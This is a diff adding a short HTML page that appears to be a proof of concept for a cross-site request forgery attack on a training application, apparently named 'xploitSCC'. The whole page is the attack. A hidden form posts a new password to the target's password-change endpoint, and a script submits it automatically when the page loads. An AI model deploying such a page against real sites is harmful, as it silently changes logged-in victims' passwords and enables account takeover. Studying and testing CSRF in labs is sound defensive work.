@@ -1,0 +1,11 @@
+<html>
+<body>
+
+<form action="http://target:8000/xploitSCC/chg_pwd_post" method="post" id="csrfForm">
+	<input name="new_password" type="hidden" value="New_Password_changed_from_POST_form" />
+</form>
+<script>
+	document.getElementById("csrfForm").submit();
+</script>
+</body>
+</html>
